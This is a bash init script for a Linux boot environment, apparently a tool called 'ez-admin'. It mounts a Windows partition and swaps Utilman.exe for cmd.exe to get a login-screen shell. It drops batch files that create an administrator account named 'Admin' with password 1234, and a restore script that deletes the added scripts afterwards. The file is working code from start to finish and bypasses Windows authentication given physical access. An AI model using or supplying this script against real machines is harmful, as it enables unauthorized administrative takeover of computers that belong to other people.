#!/bin/bash
echo "Performing basic initscript tasks..."
dmesg -n 1
mount -t devtmpfs none /dev
mount -t proc none /proc
mount -t sysfs none /sys
echo "Done!"
echo && echo

echo "Welcome to ez-admin!"
echo "Printing partitions. Please enter a partition to mount and run ez-admin on."
mkdir -p /mnt
fdisk -l

echo "Please enter a partition: "
read partition

echo "Mounting partition..."
mount $partition /mnt

echo "Backing up and replacing Utilman.exe..."
pushd /mnt/Windows/system32
  cp Utilman.exe Utilman.exe.bak
  cp cmd.exe Utilman.exe
popd

echo "Adding ez-restore.bat to System32..."
pushd /mnt/Windows/system32
  touch ez-restore.bat
  echo "@echo off" > ez-restore.bat
  echo "cd C:/Windows/system32" >> ez-restore.bat
  echo "copy Utilman.exe.bak Utilman.exe" >> ez-restore.bat
  echo "del /f ez-restore.bat" >> ez-restore.bat
  echo "del /f ez-add-user.bat" >> ez-restore.bat
  echo "del /f ez-remove-user.bat" >> ez-restore.bat
  echo "echo Finished restoring Utilman.exe and deleted scripts!" >> ez-restore.bat
popd

echo "Adding ez-add-user.bat to System32..."
pushd /mnt/Windows/system32
  touch ez-add-user.bat
  echo "@echo off" > ez-add-user.bat
  echo "net user Admin 1234 /add" >> ez-add-user.bat
  echo "net localgroup administrators Admin /add" >> ez-add-user.bat
  echo "echo Finished creating Admin user!" >> ez-add-user.bat
popd

echo "Adding ez-remove-user.bat to System32..."
pushd /mnt/Windows/system32
  touch ez-remove-user.bat
  echo "@echo off" > ez-remove-user.bat
  echo "net user Admin /delete" >> ez-remove-user.bat
  echo "echo Finished removing Admin user!" >> ez-remove-user.bat
popd

echo "Unmounting partition..."
umount $partition

echo "Done! Rebooting in 5 seconds..."
sleep 5
poweroff -f